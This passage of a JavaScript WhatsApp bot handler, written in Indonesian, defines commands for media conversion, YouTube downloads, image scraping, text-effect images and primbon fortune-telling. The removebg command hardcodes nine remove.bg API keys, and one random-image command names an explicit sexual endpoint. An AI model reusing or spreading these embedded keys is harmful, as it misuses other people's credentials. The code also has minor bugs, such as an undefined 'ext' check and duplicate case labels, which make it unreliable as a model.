            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            repjo(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            jobotz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
            if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                repjo(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await jobotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
	        if (!isCreator) return
                repjo(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    repjo(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    repjo(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
            if (!isCreator && !isBan) return
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './lib/remobg-'+getRandom('')
	    localFile = await jobotz.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './lib/hremo-'+getRandom('.png')
	    repjo(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    jobotz.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
	    if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `│➳ No : ${no++}\n│➳ Type : ${i.type}\n│➳ Video ID : ${i.videoId}\n│➳ Title : ${i.title}\n│➳ Views : ${i.views}\n│➳ Duration : ${i.timestamp}\n│➳ Upload At : ${i.ago}\n│➳ Author : ${i.author.name}\n│➳ Url : ${i.url}\n\n─────────────────\n\n`
                }
                jobotz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
        if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `│➳ *Title* : ${g.title}\n`
                teks += `│➳ *Description* : ${g.snippet}\n`
                teks += `│➳ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                repjo(teks)
                })
                }
                break
        case 'gimage': {
        if (!isCreator && !isBan) return
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: jobotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
	    if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
╭━═════════════━•
│➳ Title : ${anu.title}
│➳ Ext : Search
│➳ ID : ${anu.videoId}
│➳ Duration : ${anu.timestamp}
│➳ Viewers : ${anu.views}
│➳ Upload At : ${anu.ago}
│➳ Author : ${anu.author.name}
│➳ Channel : ${anu.author.url}
│➳ Description : ${anu.description}
│➳ Url : ${anu.url}
╰━═════════════━•`,
                    footer: jobotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
	    if (!isCreator) return
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return repjo('File Melebihi Batas '+util.format(media))
                jobotz.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
                jobotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
            if (!isCreator) return
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return repjo('File Melebihi Batas '+util.format(media))
                jobotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
	    if (!isCreator && !isBan) return
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return repjo('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return repjo('File Melebihi Batas '+util.format(media))
                jobotz.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${urls[text - 1]}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
                jobotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
            if (!isCreator && !isBan) return
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return repjo('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return repjo('File Melebihi Batas '+util.format(media))
                jobotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${urls[text - 1]}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
            if (!isCreator && !isBan) return
                repjo(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                jobotz.sendMessage(m.chat, { image: { url: result }, caption: '│➳ Media Url : '+result }, { quoted: m })
            }
            break
            case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
            if (!isCreator) return
                repjo(mess.wait)
                jobotz.sendMessage(m.chat, { image: { url: api('zenz', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            }
            break
	    case 'couple': {
	    if (!isCreator && !isBan) return
                repjo(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                jobotz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                jobotz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            if (!isCreator && !isBan) return
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: jobotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `│➳ Title : ${result.title}\n│➳ Category : ${result.type}\n│➳ Detail : ${result.source}\n│➳ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: jobotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `│➳ Title : ${result.title}\n│➳ Source : ${result.source}\n│➳ Media Url : ${result.image}`,
                    footer: jobotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'quoteanime': {
            if (!isCreator && !isBan) return
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': {
	        if (!isCreator && !isBan) return
                let anu = await fetchJson(api('zenz', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} text`
                repjo(mess.wait)
                jobotz.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
	    if (!isCreator && !isBan) return
                if (!text) throw 'No Query Text'
                repjo(mess.wait)
                jobotz.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
            if (!isCreator && !isBan) return
                if (!text) throw 'No Query Text'
                repjo(mess.wait)
                jobotz.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
	    if (!isCreator && !isBan) return
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nomor HP :* ${anu.message.nomer_hp}\n│➳ *Angka Shuzi :* ${anu.message.angka_shuzi}\n│➳ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n│➳ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Mimpi :* ${anu.message.mimpi}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama Suami :* ${anu.message.suami.nama}\n│➳ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n│➳ *Nama Istri :* ${anu.message.istri.nama}\n│➳ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Life Path :* ${anu.message.life_path}\n│➳ *Destiny :* ${anu.message.destiny}\n│➳ *Destiny Desire :* ${anu.message.destiny_desire}\n│➳ *Personality :* ${anu.message.personality}\n│➳ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendImage(m.chat,  anu.message.gambar, `│➳ *Nama Anda :* ${anu.message.nama_anda}\n│➳ *Nama Pasangan :* ${anu.message.nama_pasangan}\n│➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│➳ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Tanggal Pernikahan :* ${anu.message.tanggal}\n│➳ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
            if (!isCreator && !isBan) return
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Rezeki :* ${anu.message.rejeki}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.hari_lahir}\n│➳ *Pekerjaan :* ${anu.message.pekerjaan}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Angka Akar :* ${anu.message.angka_akar}\n│➳ *Sifat :* ${anu.message.sifat}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Analisa :* ${anu.message.analisa}\n│➳ *Sektor :* ${anu.message.sektor}\n│➳ *Elemen :* ${anu.message.elemen}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendImage(m.chat, anu.message.image, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Simbol Tarot :* ${anu.message.simbol_tarot}\n│➳ *Arti :* ${anu.message.arti}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tahun_lahir}\n│➳ *Gender :* ${anu.message.jenis_kelamin}\n│➳ *Angka Kua :* ${anu.message.angka_kua}\n│➳ *Kelompok :* ${anu.message.kelompok}\n│➳ *Karakter :* ${anu.message.karakter}\n│➳ *Sektor Baik :* ${anu.message.sektor_baik}\n│➳ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Kala Tinantang :* ${anu.message.kala_tinantang}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hari Naas :* ${anu.message.hari_naas}\n│➳ *Info :* ${anu.message.catatan}\n│➳ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Arah Rezeki :* ${anu.message.arah_rejeki}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
